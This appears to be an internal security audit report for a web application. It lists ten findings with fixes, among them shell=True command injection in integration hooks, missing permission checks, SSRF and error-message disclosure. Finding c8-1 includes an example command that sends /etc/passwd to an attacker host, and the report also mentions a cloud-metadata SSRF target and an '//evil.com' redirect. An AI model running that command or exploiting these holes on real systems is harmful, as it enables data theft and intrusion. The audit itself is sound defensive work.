# Security Scan Report — Cycle 8
**Date:** 2026-02-28
**Type:** Security
**Files scanned:** app/api/, app/services/, app/web/, app/models/, app/tasks/, templates/

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 1 |
| High | 4 |
| Medium | 3 |
| Low | 2 |
| **Total** | **10** |

Focus areas this cycle: command injection, authorization gaps on high-value endpoints, SSRF, and information disclosure via exception messages.

---

## New Findings

### CRITICAL

#### security-c8-1 — RCE via CLI Integration Hook (`shell=True`)
**File:** `app/services/integration_hooks.py:417`

`_execute_cli_hook()` executes admin-configured hook commands with `subprocess.run(command, shell=True, ...)`. Any authenticated admin user who can access the integrations module can create a CLI hook with an arbitrary shell command (e.g., `curl http://attacker.com?d=$(cat /etc/passwd)`) and trigger it via the test or event execution path. This is a direct path from admin portal access to OS-level remote code execution as the application user.

**Fix:** Use `shlex.split(command)` with `shell=False`.

---

### HIGH

#### security-c8-2 — Celery Task Injection via Scheduler API
**File:** `app/api/scheduler.py:30`

All 5 scheduler endpoints have no `require_permission` dependency. Any authenticated user can `POST /scheduler/tasks` with an arbitrary `task_name` (only length-validated, no allowlist) and then `POST /scheduler/tasks/{id}/enqueue` to trigger `celery_app.send_task(task_name, args, kwargs)` with attacker-controlled arguments. This could invoke any registered Celery task — bulk invoice generation, email blasts, data exports, or deletion tasks — with arbitrary payloads.

**Fix:** Add `require_permission('scheduler:write')` to mutation endpoints; add task_name allowlist validation in `scheduler.py:97`.

#### security-c8-3 — Search Endpoints Missing Permission Checks
**File:** `app/api/search.py:1`

All 15 typeahead search endpoints (subscribers, accounts, contacts, invoices, subscriptions, NAS devices, network devices, vendors, resellers, etc.) have only router-level `require_user_auth`, no per-endpoint `require_permission`. Any authenticated low-privilege user can enumerate all business data through search.

**Fix:** Add entity-appropriate `require_permission` to each search endpoint.

#### security-c8-4 — Analytics Endpoints Missing Permission Checks
**File:** `app/api/analytics.py:1`

All 8 analytics endpoints (KPI config CRUD + KPI aggregate CRUD + KPI compute) have only `require_user_auth`. Any authenticated user can create, modify, delete, and trigger KPI computations without being granted analytics access.

**Fix:** Add `require_permission('analytics:read')` and `'analytics:write'` as appropriate.

#### security-c8-5 — GIS Sync Missing Permission Check
**File:** `app/api/gis.py:368`

`POST /gis/sync` (with optional `deactivate_missing=True` flag) has no `require_permission` check. Any authenticated user can trigger a full GIS resynchronization that could deactivate address records.

**Fix:** Add `dependencies=[Depends(require_permission('gis:write'))]`.

---

### MEDIUM

#### security-c8-6 — SSRF via HTTP Integration Hook URL
**File:** `app/services/integration_hooks.py:398`

`_execute_http_hook()` sends `httpx.request()` to the admin-configured `hook.url` without any RFC 1918 / link-local block. An admin can probe `http://169.254.169.254/` (cloud metadata), internal Redis, PostgreSQL health endpoints, or other services on the application's network.

**Fix:** Apply RFC 1918 SSRF guard before making the outbound request (same pattern needed as `web_integrations.py:268`).

#### security-c8-7 — Exception Message Disclosure in Nextcloud Talk API
**File:** `app/api/nextcloud_talk.py:37,52,69`

Three endpoints return `detail=str(exc)` for `NextcloudTalkError` — exception messages may include internal hostnames, connection strings, or configuration paths.

**Fix:** Return `detail='External service error'` and log the full exception server-side.

#### security-c8-8 — Exception Message Disclosure in Vendor Routes
**File:** `app/services/web_vendor_routes.py:372`

`vendor_fiber_map_update_asset_location()` returns `JSONResponse({'error': str(exc)})` for any uncaught exception — DB constraint violations, internal errors with schema details, etc. are exposed to vendor portal users.

**Fix:** Return generic error, log internally.

---

### LOW

#### security-c8-9 — Exception Disclosure in Billing Payment Import
**File:** `app/web/admin/billing_payments.py:673`

Payment import error handler returns `f'Import failed: {str(exc)}'` to the admin UI, potentially leaking internal file paths or library details.

**Fix:** Return generic message, log internally.

#### security-c8-10 — PromQL Injection via OLT Name
**File:** `app/services/web_network_core_devices_views.py:45`

`olt.name` is interpolated directly into PromQL label selectors without escaping. An admin who sets an OLT name containing `}` or `{` characters could inject arbitrary PromQL expressions into VictoriaMetrics queries.

**Fix:** Escape `{` / `}` characters in `olt_name` before interpolation.

---

## Comparison with Previous Scans

### What's New This Cycle
All 10 findings are new. No previously-known findings were re-reported.

### What's Still Open (from prior cycles)
Key open security issues from previous cycles:
- **ssl_verify=False** in wireguard.py, provisioning_adapters.py, mikrotik_poller.py (5 locations)
- **SSRF**: webhooks.py:103, nextcloud_talk.py:125, sms.py:192, web_integrations.py:268, secrets.py:39
- **Path traversal**: avatar.py:54, file_storage.py:360, web/admin/system.py:623, web_network_olts.py:190
- **Open redirect** in `_safe_next()` via `//evil.com` (web_auth.py:33, web_customer_auth.py:26)
- **Stored XSS** via `| safe` in document.html:108 and sign.html:26
- **IDOR** in wireguard.py:246 (peer private key accessible to any user)
- **Unauthenticated metrics** at `/metrics`
- **Rate limiting gaps** on web form login endpoints
- **WireGuard interface_name** path traversal (wireguard_system.py:173)
- **Auth scope bypass** in auth_dependencies.py:109

### Pattern Shift
This cycle reveals a **systemic authorization gap**: multiple high-value API modules (search, analytics, scheduler, GIS sync) rely only on `require_user_auth` and never receive `require_permission` checks. This suggests the pattern was applied inconsistently during initial development and requires a systematic audit of all API routers.

---

## Top 3 Priority Fixes

1. **[CRITICAL] security-c8-1** — `integration_hooks.py:417` shell=True command injection. One-line fix (`shlex.split` + `shell=False`) eliminates OS-level RCE. Highest priority.

2. **[HIGH] security-c8-2** — `scheduler.py` task injection. Add permission checks and a task_name allowlist to prevent any user from invoking arbitrary Celery tasks with attacker-controlled args.

3. **[HIGH] security-c8-3** — `search.py` authorization gap. Search endpoints expose all subscriber, billing, and network data to any authenticated user. Add entity-scoped permission checks.

---

## Codebase Health Score: 52/100

Down slightly from last cycle (55-58/100) due to newly discovered critical RCE vector and multiple high-severity auth gaps on high-traffic endpoints.

| Dimension | Score | Notes |
|-----------|-------|-------|
| Auth & access control | 45 | Persistent gaps: search, analytics, scheduler, GIS sync missing require_permission |
| Injection defenses | 55 | New critical: shell=True CLI hooks; existing RADIUS SQL f-strings still open |
| Secrets & crypto | 70 | Credential encryption in place; config defaults still weak |
| SSRF & outbound | 50 | Multiple vectors unguarded; new integration hooks HTTP hook gap |
| Error handling | 60 | Exception disclosure in multiple endpoints; pattern still widespread |
| Path traversal | 55 | 4 open locations from prior cycles |

---

## Trend: **Degrading**

New findings this cycle include a CRITICAL severity RCE and 4 HIGH authorization gaps, pushing the score down from the previous range of 55-58. The authorization gap pattern (rely on `require_user_auth` only) is systemic and was not caught in prior cycles because earlier scans focused on individual endpoints rather than router-level gaps.
